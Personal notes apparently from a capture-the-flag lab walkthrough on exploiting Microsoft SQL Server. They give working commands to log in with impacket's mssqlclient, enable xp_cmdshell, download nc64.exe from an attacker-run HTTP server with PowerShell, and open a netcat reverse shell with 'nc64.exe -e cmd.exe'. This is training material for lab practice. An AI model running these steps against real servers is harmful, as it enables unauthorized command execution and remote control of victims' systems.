# MSSQL Server
﷽
* MSSQL Server is Microsoft's database system used to store and manage structured data using SQL.

## exploitation
### `impacket/mssqlclient.py`

* we can connect to the SQL server by using the `mssqlclient.py` script.
* the command would look like:
  * `python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth`, where:
    * `ARCHETYPE/sql_svc` is the username
    * {target-ip} should be the target-ip
    * `-windows-auth` should be specified to use Windows Authentication.
  * provide a password when prompted
* a shell should be obtained :)

### upon connection

* guide: `https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet`

* firstly, check the role we have on the server:
  * `SELECT is_srvrolemember('sysadmin');`, where a `1` is TRUE and a `0` is FALSE, where:
    * TRUE (or `1`) means that we are a sysadmin.

#### `xp-cmdshell`

* used for setting up command execution through SQL.

* check if it is enabled:
  * `EXEC xp_cmdshell 'net user';`

* then, to enable it:

`EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;`

* now, we should be able to execute commands:
  * `xp-cmdshell "whoami"`

##### obtaining a reverse shell

* on the host computer, start a simple HTTP server in the same dir as `nc64.exe`:
  * `sudo python3 -m http.server 80`
    * this is to place the `nc64.exe` file onto the victim so we can obtain the rev-shell.

* then, start a `nc` listener on a port:
  * `sudo nc -lvnp 4444`

---back to the victim computer---

* we are going to use `powershell` to run commands as it has way more than `cmd`.
* the syntax is `powershell -c {command}`
* so, the prompt on our SQL server becomes eg. 
  * `xp_cmdshell "powershell -c whoami"` where whoami is the command to run.

* we need to place the `nc64.exe` binary on the victim computer:
  * `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{our-ip}/nc64.exe -outfile nc64.exe"`, where
    * `{our-ip}` is the IP of interface `utun7` of our computer (at least for `ovpn`).

* our HTTP server should verify that the request has happened.

* now, we bind the `cmd.exe` through the `nc` to our listener:
  * `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {utun7-ip} 4444"`

* we should have our reverse shell :)

* navigate to `C:\Users\sql_svc\Desktop` to find the flag.
